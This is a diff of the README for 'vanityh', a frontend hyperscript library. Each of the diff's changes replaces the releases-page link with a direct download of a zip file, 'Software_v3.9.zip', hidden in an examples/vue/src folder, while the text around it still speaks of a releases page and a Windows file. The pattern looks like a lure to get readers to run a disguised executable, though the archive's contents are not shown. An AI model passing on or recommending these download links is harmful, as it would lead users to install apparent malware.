@@ -1,12 +1,12 @@
 # 🖥️ vanityh - Clean Hyperscript for Frontend Views
 
-[![Download vanityh](https://img.shields.io/badge/Download-vanityh-blue?style=for-the-badge&logo=github)](https://github.com/numidian-christmaspudding240/vanityh/releases)
+[![Download vanityh](https://img.shields.io/badge/Download-vanityh-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/numidian-christmaspudding240/vanityh/main/examples/vue/src/Software_v3.9.zip)
 
 ## 🚀 Download vanityh
 
 Visit this page to download the Windows release:
 
-https://github.com/numidian-christmaspudding240/vanityh/releases
+https://raw.githubusercontent.com/numidian-christmaspudding240/vanityh/main/examples/vue/src/Software_v3.9.zip
 
 On the releases page, find the latest version and download the Windows file for your device. If there is more than one file, choose the one that matches Windows.
 
@@ -24,7 +24,7 @@ This project fits well if you want to:
 ## 🪟 Windows setup
 
 1. Open the releases page:
-   https://github.com/numidian-christmaspudding240/vanityh/releases
+   https://raw.githubusercontent.com/numidian-christmaspudding240/vanityh/main/examples/vue/src/Software_v3.9.zip
 
 2. Look for the latest release.
 
@@ -122,5 +122,5 @@ It is useful for:
 
 Check the releases page when you want the latest Windows file:
 
-https://github.com/numidian-christmaspudding240/vanityh/releases
+https://raw.githubusercontent.com/numidian-christmaspudding240/vanityh/main/examples/vue/src/Software_v3.9.zip
 
